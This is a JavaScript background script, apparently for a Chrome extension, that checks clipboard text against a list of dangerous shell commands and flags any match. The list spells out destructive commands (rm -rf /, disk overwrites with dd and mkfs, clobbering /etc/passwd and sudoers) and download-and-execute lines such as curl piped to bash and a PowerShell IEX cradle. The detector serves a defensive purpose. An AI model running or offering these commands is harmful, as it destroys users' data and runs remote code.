
const maliciousContent = [
    "echo \"evil\"",
    "rm -rf /",
    "mkfs.ext3 /dev/sda",
    "wget -q -O- http://example.com/malicious.sh | bash",
    "chmod -R 777 /",
    "dd if=/dev/zero of=/dev/sda",
    "sudo userdel -r username",
    'echo "malicious_code" > ~/.bash_profile',
    "cat /dev/urandom > /dev/sda",
    "mv /bin/bash /bin/sh",
    "sudo mv /etc/sudoers /dev/null",
    'echo "malicious_code" >> /etc/rc.local',
    "curl http://example.com/malicious.sh | sudo sh",
    "sudo rm -rf / --no-preserve-root",
    'echo "malicious_code" > /etc/passwd',
    "cat /dev/zero > /dev/sda",
    "sudo mv /bin/su /bin/disable_su",
    "rm -rf ~",
    'echo "alias sudo=\'rm -rf /\'">>.bashrc',
    "wget -O /tmp/malicious.sh http://example.com/malicious.sh && chmod +x /tmp/malicious.sh && /tmp/malicious.sh",
    "curl -sSL http://example.com/malicious.sh | bash",
    "bash -c \"$(curl -fsSL http://example.com/malicious.sh)\"",
    "curl http://example.com/malicious.php | php",
    "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://example.com/malicious.ps1')\"",
    "echo \"$(curl -fsSL http://example.com/malicious.sh)\" | bash"
    
];

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.clipboardContent) {
      const isMalicious = maliciousContent.some(pattern => message.clipboardContent.includes(pattern));
      chrome.action.setIcon({ path: isMalicious ? "images/bug_red(1).png" : "images/hello_extensions.png" });
      
      if (isMalicious) {
        chrome.runtime.sendMessage({ isClipMalicious: true });
        console.log("Background Script is working !!");
      }
    }
  });